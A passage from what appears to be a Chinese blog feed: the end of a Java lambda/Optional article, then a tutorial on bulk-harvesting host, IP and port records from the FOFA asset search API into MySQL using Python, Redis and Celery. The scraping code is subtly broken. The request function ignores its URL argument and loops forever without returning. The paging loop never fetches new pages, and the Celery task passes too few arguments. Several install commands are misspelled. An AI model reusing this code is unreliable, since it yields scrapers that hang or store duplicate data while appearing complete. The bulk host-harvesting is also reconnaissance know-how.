src="https://img.zhiiyun.com/v2-493168d1a72120d69b0d13b4711c3c9f_hd.jpg" alt=""></p><h4 id="第二步简化-用Iterable-forEach-取代foreach-loop："><a href="#第二步简化-用Iterable-forEach-取代foreach-loop：" class="headerlink" title="第二步简化 - 用Iterable.forEach()取代foreach loop："></a>第二步简化 - 用Iterable.forEach()取代foreach loop：</h4><p><img src="https://img.zhiiyun.com/v2-bdd6f5a6dbf65b578080f7b7ad5ab6cf_hd.jpg" alt=""></p><p>由于静态函数其实只是对List进行了一通操作，这里我们可以甩掉静态函数，直接使用stream()特性来完成。stream()的几个方法都是接受Predicate<t>，Consumer<t>等参数的（java.util.stream (Java Platform SE 8 )）。你理解了上面的内容，stream()这里就非常好理解了，并不需要多做解释。</t></t></p><h4 id="第三步简化-利用stream-替代静态函数："><a href="#第三步简化-利用stream-替代静态函数：" class="headerlink" title="第三步简化 - 利用stream()替代静态函数："></a>第三步简化 - 利用stream()替代静态函数：</h4><p><img src="https://img.zhiiyun.com/v2-e196d987f852b9b8e26a6a9dac648a06_hd.jpg" alt=""></p><p>对比最开始的Lambda写法，这里已经非常非常简洁了。但是如果，我们的要求变一下，变成print这个人的全部信息，及p -&gt; System.out.println(p); 那么还可以利用Method reference来继续简化。所谓Method reference, 就是用已经写好的别的Object/Class的method来代替Lambda expression。格式如下：</p><p><img src="https://img.zhiiyun.com/v2-12622326a5682285ce235d96291f3bb8_hd.jpg" alt=""></p><h4 id="第四步简化-如果是println-p-，则可以利用Method-reference代替forEach中的Lambda表达式："><a href="#第四步简化-如果是println-p-，则可以利用Method-reference代替forEach中的Lambda表达式：" class="headerlink" title="第四步简化 - 如果是println(p)，则可以利用Method reference代替forEach中的Lambda表达式："></a>第四步简化 - 如果是println(p)，则可以利用Method reference代替forEach中的Lambda表达式：</h4><p><img src="https://img.zhiiyun.com/v2-f29e6569d0265b91794565ae81d54265_hd.jpg" alt=""></p><p>这基本上就是能写的最简洁的版本了。</p><h3 id="Lambda配合Optional可以使Java对于null的处理变的异常优雅"><a href="#Lambda配合Optional可以使Java对于null的处理变的异常优雅" class="headerlink" title="Lambda配合Optional可以使Java对于null的处理变的异常优雅"></a>Lambda配合Optional<t>可以使Java对于null的处理变的异常优雅</t></h3><p>这里假设我们有一个person object，以及一个person object的Optional wrapper:</p><p><img src="https://img.zhiiyun.com/v2-e78d71b9699504e46d86d77aabec42cf_hd.jpg" alt=""></p><p>Optional<t>如果不结合Lambda使用的话，并不能使原来繁琐的null check变的简单。</t></p><p><img src="https://img.zhiiyun.com/v2-ce82e2c3e69caab9acdec9d4e42cde0e_hd.jpg" alt=""></p><h3 id="只有当Optional结合Lambda一起使用的时候，才能发挥出其真正的威力！"><a href="#只有当Optional结合Lambda一起使用的时候，才能发挥出其真正的威力！" class="headerlink" title="只有当Optional结合Lambda一起使用的时候，才能发挥出其真正的威力！"></a>只有当Optional<t>结合Lambda一起使用的时候，才能发挥出其真正的威力！</t></h3><p>我们现在就来对比一下下面四种常见的null处理中，Java 8的Lambda+Optional<t>和传统Java两者之间对于null的处理差异。</t></p><h4 id="情况一-存在则开干"><a href="#情况一-存在则开干" class="headerlink" title="情况一 - 存在则开干"></a>情况一 - 存在则开干</h4><p><img src="https://img.zhiiyun.com/v2-f41305009c93effa8fe047631d5342ed_hd.jpg" alt=""></p><h4 id="情况二-存在则返回，无则返回屁"><a href="#情况二-存在则返回，无则返回屁" class="headerlink" title="情况二 - 存在则返回，无则返回屁"></a>情况二 - 存在则返回，无则返回屁</h4><p><img src="https://img.zhiiyun.com/v2-cfa0e3298ba94efa29dc9cb8b32356fe_hd.jpg" alt=""></p><h4 id="情况三-存在则返回，无则由函数产生"><a href="#情况三-存在则返回，无则由函数产生" class="headerlink" title="情况三 - 存在则返回，无则由函数产生"></a>情况三 - 存在则返回，无则由函数产生</h4><p><img src="https://img.zhiiyun.com/v2-4091bb966ac575fd83d5fa07dd7c2dce_hd.jpg" alt=""></p><h4 id="情况四-夺命连环null检查"><a href="#情况四-夺命连环null检查" class="headerlink" title="情况四 - 夺命连环null检查"></a>情况四 - 夺命连环null检查</h4><p><img src="https://img.zhiiyun.com/v2-7bc0ac86cd29a1cea92a853d73f41cec_hd.jpg" alt=""></p><p>由上述四种情况可以清楚地看到，Optional<t>+Lambda可以让我们少写很多ifElse块。尤其是对于情况四那种夺命连环null检查，传统java的写法显得冗长难懂，而新的Optional<t>+Lambda则清新脱俗，清楚简洁。</t></t></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">作者：Mingqi</span><br><span class="line">链接：https://www.zhihu.com/question/20125256/answer/324121308</span><br><span class="line">来源：知乎</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JDK </tag>
            
            <tag> 函数编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA爬虫大法——API的简单利用</title>
      <link href="/posts/f5ba6079/"/>
      <url>/posts/f5ba6079/</url>
      
        <content type="html"><![CDATA[<p>最近因项目需要，需要爬虫FOFA里面数据进行数据统计分析，因此就有了本篇文章。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>描述环境为文章中所用到的所有技术以及中间件并非全部安装，可根据使用的规模进行调整使用。</p><p>语言：python2.7（必须）</p><p>模块：requests（必须）</p><p>操作系统：MacOS 10.13.4（非必须）</p><p>分布式消息队列管理：Celery（最后一节安装）</p><p>日志记录：logging（必须）</p><p>中间价：Redis（最后一节安装）/MySQL（必须）</p><p>数据库操作：pymysql（必须）/DBUtils（必须）</p><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 安装requests</span><br><span class="line"></span><br><span class="line">pip isntall requests</span><br><span class="line"></span><br><span class="line"># 安装celery Mac</span><br><span class="line"></span><br><span class="line">pip install celery</span><br><span class="line"></span><br><span class="line"># 安装celery Windows</span><br><span class="line"></span><br><span class="line">pip isntall celery=3.1.25</span><br><span class="line"></span><br><span class="line"># 安装 pymysql</span><br><span class="line"></span><br><span class="line">pip install pymysql</span><br><span class="line"></span><br><span class="line"># 安装logging</span><br><span class="line">pip install logging</span><br><span class="line"></span><br><span class="line"># 安装 DBUtils 数据库连接池</span><br><span class="line">pip install DBUtils</span><br></pre></td></tr></table></figure><p>注：Windows安装Celery时最好安装3.1.25版本，不然可能会有意想不到的惊喜。</p><h2 id="FOFA-API"><a href="#FOFA-API" class="headerlink" title="FOFA API"></a>FOFA API</h2><p>文档：<a href="https://fofa.so/api" target="_blank" rel="noopener">https://fofa.so/api</a></p><p>请求：<a href="https://fofa.so/api/v1/search/all" target="_blank" rel="noopener">https://fofa.so/api/v1/search/all</a></p><p>请求方式：GET</p><p>请求参数：</p><table><thead><tr><th style="text-align:center">参数名称</th><th style="text-align:center">参数类型</th><th style="text-align:center">参数描述</th><th style="text-align:center">是否必须</th></tr></thead><tbody><tr><td style="text-align:center">email</td><td style="text-align:center">string</td><td style="text-align:center">FOFA pro账号邮箱</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">key</td><td style="text-align:center">string</td><td style="text-align:center">FOFA pro账户登陆key</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">qbase64</td><td style="text-align:center">string</td><td style="text-align:center">FOFA查询语句base64编码</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">page</td><td style="text-align:center">int</td><td style="text-align:center">页码，默认为第一页</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">size</td><td style="text-align:center">int</td><td style="text-align:center">每页数量，默认100条</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">fields</td><td style="text-align:center">string</td><td style="text-align:center">字段段列表，默认为host，用逗号分隔多个参数，如(fields=ip,title)，可选的列表有：host title ip domain port country city</td><td style="text-align:center">否</td></tr></tbody></table><p>响应：</p><table><thead><tr><th style="text-align:center">参数名称</th><th style="text-align:center">参数类型</th><th style="text-align:center">参数描述</th></tr></thead><tbody><tr><td style="text-align:center">mode</td><td style="text-align:center">string</td><td style="text-align:center">查询模式</td></tr><tr><td style="text-align:center">page</td><td style="text-align:center">int</td><td style="text-align:center">当前页码</td></tr><tr><td style="text-align:center">size</td><td style="text-align:center">int</td><td style="text-align:center">请求返回结果的总数</td></tr><tr><td style="text-align:center">results</td><td style="text-align:center">array</td><td style="text-align:center">请求返回结果的详情数组</td></tr></tbody></table><h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><p>设计数据库存放FOFA爬虫数据，方便统计查询。</p><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">字段类型</th><th style="text-align:center">是否允许为空</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int(11)</td><td style="text-align:center">否</td><td style="text-align:center">id自增</td></tr><tr><td style="text-align:center">host</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">否</td><td style="text-align:center">host</td></tr><tr><td style="text-align:center">ip</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">否</td><td style="text-align:center">ip地址</td></tr><tr><td style="text-align:center">port</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">否</td><td style="text-align:center">端口号</td></tr><tr><td style="text-align:center">protocol</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">否</td><td style="text-align:center">协议</td></tr><tr><td style="text-align:center">country_ name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">是</td><td style="text-align:center">国家名称</td></tr><tr><td style="text-align:center">region_name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">是</td><td style="text-align:center">省份名称</td></tr><tr><td style="text-align:center">city_name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">是</td><td style="text-align:center">城市名称</td></tr><tr><td style="text-align:center">isp</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">是</td><td style="text-align:center">运营商</td></tr><tr><td style="text-align:center">fofa_sql</td><td style="text-align:center">text</td><td style="text-align:center">否</td><td style="text-align:center">FOFA查询语句</td></tr><tr><td style="text-align:center">create_date</td><td style="text-align:center">datetime</td><td style="text-align:center">否</td><td style="text-align:center">创建时间</td></tr><tr><td style="text-align:center">update_date</td><td style="text-align:center">datetime</td><td style="text-align:center">否</td><td style="text-align:center">更新时间</td></tr></tbody></table><p>sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`fofa_spider`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`fofa_spider`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">INT</span> (<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    <span class="string">`host`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`ip`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`port`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`protocol`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`country_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`region_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`city_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`fofa_sql`</span> <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`create_date`</span> DATETIME <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`update_date`</span> DATETIME <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">INNODB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8mb4;</span><br></pre></td></tr></table></figure><p>数据库sql文件：<a href="https://github.com/0nise/scripts/blob/master/fofa_spider.sql" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider.sql</a></p><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>本节主要讲解可适用与一般的FOFA爬虫，如果需要大批量数据爬虫请您接着往下看。</p><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>语言：python2.7</p><p>中间件：MySQL</p><p>第三方包：pymysql/requests/</p><p>场景：小规模爬虫/一般爬虫</p><p>通过查看FOFA API可以得知请求地址和参数，开局一句话功能全靠编。</p><h3 id="请求中心"><a href="#请求中心" class="headerlink" title="请求中心"></a>请求中心</h3><p>在发送大量的http请求时最好使用统一的HTTP请求中心，方便控制，代码重复利用，提高效率。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line"><span class="comment"># 请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">请求中心，控制程序所有HTTP请求，如果请求发生错误进行尝试再次连接</span></span><br><span class="line"><span class="string">@param url 请求连接</span></span><br><span class="line"><span class="string">@return 请求响应结果</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fofa_requests</span><span class="params">(url)</span>:</span></span><br><span class="line">    rs_content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rs = session.get(api_url, verify=<span class="keyword">False</span>,headers=headers)</span><br><span class="line">            rs_text = rs.text</span><br><span class="line">            results = json.loads(rs_text)</span><br><span class="line">            total_size = results[<span class="string">'size'</span>]</span><br><span class="line">            error = results</span><br><span class="line">            <span class="keyword">if</span> results[<span class="string">'error'</span>] <span class="keyword">and</span> <span class="string">'None'</span> <span class="keyword">not</span> <span class="keyword">in</span> results[<span class="string">'error'</span>]:</span><br><span class="line">                info = <span class="string">u'fofa 错误:'</span>+results[<span class="string">'error'</span>]+<span class="string">u' 休眠30s'</span></span><br><span class="line">                logging.error(info)</span><br><span class="line">                time.sleep(<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rs_content = results</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">u'fofa 错误:'</span>+str(e.message)+<span class="string">u' 休眠30s'</span>)</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            time.sleep(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> rs_content</span><br></pre></td></tr></table></figure><h3 id="数据库存储"><a href="#数据库存储" class="headerlink" title="数据库存储"></a>数据库存储</h3><p>有了统一的请求中心接下来就该编写入库代码，将爬虫结果存入数据库中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">批量数据存入数据库</span></span><br><span class="line"><span class="string">@param results </span></span><br><span class="line"><span class="string">@param page_no 当前页数</span></span><br><span class="line"><span class="string">@param page_total 总页数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">batch_insert_db</span><span class="params">(results,page_no,page_total,fofa_sql)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Z = []</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            a = (str(result[<span class="number">0</span>]),str(result[<span class="number">1</span>]),str(result[<span class="number">2</span>]),str(result[<span class="number">3</span>]),str(result[<span class="number">4</span>]),str(result[<span class="number">5</span>]),str(result[<span class="number">6</span>]),pymysql.escape_string(fofa_sql))</span><br><span class="line">            Z.append(a)</span><br><span class="line">        sql = <span class="string">"INSERT IGNORE INTO fofa_spider(id,host,ip,port,protocol,country_name,region_name,city_name,fofa_sql,create_date,update_date) VALUES(DEFAULT,%s,%s,%s,%s,%s,%s,%s,%s,NOW(),NOW())"</span></span><br><span class="line">        cursor.executemany(sql, Z)</span><br><span class="line">        connection.commit()</span><br><span class="line">        logging.info(<span class="string">u'存入数据库ok,总数量为:'</span>+str(len(Z))+<span class="string">u', page--&gt; '</span>+str(page_no)+<span class="string">'/'</span>+str(page_total))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(<span class="string">u"存入数据库错误,错误信息:"</span>+e.message)</span><br><span class="line">        traceback.print_exc()</span><br></pre></td></tr></table></figure><h3 id="核心业务代码"><a href="#核心业务代码" class="headerlink" title="核心业务代码"></a>核心业务代码</h3><p>可以存入数据库中就该写核心的函数逻辑函数，输入参数仅为FOFA检索语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fofa 爬虫主函数</span></span><br><span class="line"><span class="string">@param fofa_sql fofa查询语句</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(fofa_sql)</span>:</span></span><br><span class="line">    base64_str = base64.b64encode(fofa_sql)</span><br><span class="line">    fields_str = <span class="string">','</span>.join(fields)</span><br><span class="line">    api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_start)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    total_size = rs[<span class="string">'size'</span>]</span><br><span class="line">    <span class="comment"># 计算页数</span></span><br><span class="line">    page_end = total_size / page_size + <span class="number">1</span> <span class="keyword">if</span> total_size % page_size != <span class="number">0</span> <span class="keyword">else</span> total_size / page_size</span><br><span class="line">    <span class="comment"># 存入u 数据库</span></span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],page_start,page_end,fofa_sql)</span><br><span class="line">    <span class="keyword">for</span> page_no <span class="keyword">in</span> range(<span class="number">1</span>,page_end+<span class="number">1</span>):</span><br><span class="line">        api_url = <span class="string">'http://fofa.so/api/v1/search/all?email='</span>+fofa_name+<span class="string">'&amp;key='</span>+fofa_key+<span class="string">'&amp;fields='</span>+fields_str+<span class="string">'&amp;size='</span>+str(page_size)+<span class="string">'&amp;page='</span>+str(page_no)+<span class="string">'&amp;qbase64='</span>+base64_str</span><br><span class="line">        batch_insert_db(rs[<span class="string">'results'</span>],page_start,page_end,fofa_sql)</span><br></pre></td></tr></table></figure><p>程序运行结果：</p><p><img src="/posts/f5ba6079/WX20190301-210151@2x.png" alt="运行结果"></p><p>完整代码地址：<a href="https://github.com/0nise/scripts/blob/master/fofa_spider.py" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider.py</a></p><p>注：运行脚本之前先配置相关配置信息（数据库/FOFA信息）</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>针对一般的数据爬虫数据爬虫，上述方法可以完美适应。但如果需要爬虫的是为千万级别规模的数据上述方法就显得有点不行了，解决方案有一般有多线程/多进程/协程等。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>针对大规模数据爬虫，很多人想到的是多线程/多进程/协程等方案，但是这些方案的可扩展并不是很强，如果需要调整工具需要停止程序修改程序等，这里我的思路是使用生产者和消费的思路来处理。只需要对上述的代码做轻微修改就可以完美的适应大规模数据爬虫，这里我使用redis+celery的方式来实现。</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p> Redis是一款开源的、高性能的键-值存储（key-value store）。它常被称作是一款数据结构服务器（data structure server）。</p><p>Redis的键值可以包括字符串（strings）类型，同时它还包括哈希（hashes）、列表（lists）、集合（sets）和 有序集合（sorted sets）等数据类型。 对于这些数据类型，你可以执行原子操作。例如：对字符串进行附加操作（append）；递增哈希中的值；向列表中增加元素；计算集合的交集、并集与差集等。</p><p>为了获得优异的性能，Redis采用了内存中（in-memory）数据集（dataset）的方式。同时，Redis支持数据的持久化，你可以每隔一段时间将数据集转存到磁盘上（snapshot），或者在日志尾部追加每一条操作命令（append only file,aof）。</p><p>Redis同样支持主从复制（master-slave replication），并且具有非常快速的非阻塞首次同步（ non-blocking first synchronization）、网络断开自动重连等功能。同时Redis还具有其它一些特性，其中包括简单的事物支持、发布订阅 （ pub/sub）、管道（pipeline）和虚拟内存（vm）等 。<br>Redis具有丰富的客户端，支持现阶段流行的大多数编程语言。</p><h3 id="celery"><a href="#celery" class="headerlink" title="celery"></a>celery</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Celery（芹菜）是一个简单、灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。</p><h6 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h6><p>任务队列是一种在线程或机器间分发任务的机制。</p><h6 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h6><p>消息队列的输入是工作的一个单元，称为任务，独立的职程（Worker）进程持续监视队列中是否有需要处理的新任务。</p><p>Celery 用消息通信，通常使用中间人（Broker）在客户端和职程间斡旋。这个过程从客户端向队列添加消息开始，之后中间人把消息派送给职程，职程对消息进行处理。如下图所示：<br><img src="/posts/f5ba6079/1018261-20161017182409279-50086417.png" alt="1018261-20161017182409279-50086417"><br>Celery 系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。</p><h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>Celery的架构由三部分组成，消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（task result store）组成。</p><h5 id="消息中间件"><a href="#消息中间件" class="headerlink" title="消息中间件"></a>消息中间件</h5><p>Celery本身不提供消息服务，但是可以方便的和第三方提供的消息中间件集成，包括，<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>,<a href="http://mongodb.org/" target="_blank" rel="noopener">MongoDB</a>等，这里我先去了解<a href="http://rabbitmq.com/" target="_blank" rel="noopener">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="noopener">Redis</a>。</p><h5 id="任务执行单元"><a href="#任务执行单元" class="headerlink" title="任务执行单元"></a>任务执行单元</h5><p>Worker是Celery提供的任务执行的单元，worker并发的运行在分布式的系统节点中</p><h5 id="任务结果存储"><a href="#任务结果存储" class="headerlink" title="任务结果存储"></a>任务结果存储</h5><p>Task result store用来存储Worker执行的任务的结果，Celery支持以不同方式存储任务的结果，包括Redis，MongoDB，Django ORM，AMQP等，这里我先不去看它是如何存储的，就先选用Redis来存储任务执行结果。</p><p>官方文档：<a href="http://docs.celeryproject.org/en/latest/" target="_blank" rel="noopener">http://docs.celeryproject.org/en/latest/</a><br>中文笔记：<a href="http://www.cnblogs.com/forward-wang/p/5970806.html" target="_blank" rel="noopener">http://www.cnblogs.com/forward-wang/p/5970806.html</a></p><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>上面看不懂没关系，会用就行。</p><p><img src="/posts/f5ba6079/1500286923_459579.jpg" alt=""></p><p>添加celery配置信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Celery</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> platforms,Celery</span><br><span class="line">platforms.C_FORCE_ROOT =  <span class="keyword">True</span></span><br><span class="line"><span class="comment"># Redis连接地址，如果为本机不需要做修改</span></span><br><span class="line">broker =  <span class="string">'redis://127.0.0.1:6379/0'</span></span><br><span class="line">app = Celery(<span class="string">'fofa_spider'</span>,broker=broker)</span><br></pre></td></tr></table></figure><p>添加核心函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">celery 爬虫</span></span><br><span class="line"><span class="string">@param api_url 爬虫URL</span></span><br><span class="line"><span class="string">@param fofa_sql FOFA语句</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">celery_spider</span><span class="params">(api_url,fofa_sql)</span>:</span></span><br><span class="line">    rs = fofa_requests(api_url)</span><br><span class="line">    batch_insert_db(rs[<span class="string">'results'</span>],fofa_sql)</span><br></pre></td></tr></table></figure><p>修改业务逻辑代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fofa 爬虫主函数</span></span><br><span class="line"><span class="string">@param fofa_sql fofa查询语句</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(fofa_sql)</span>:</span></span><br><span class="line">    base64_str = base64.b64encode(fofa_sql)</span><br><span class="line">    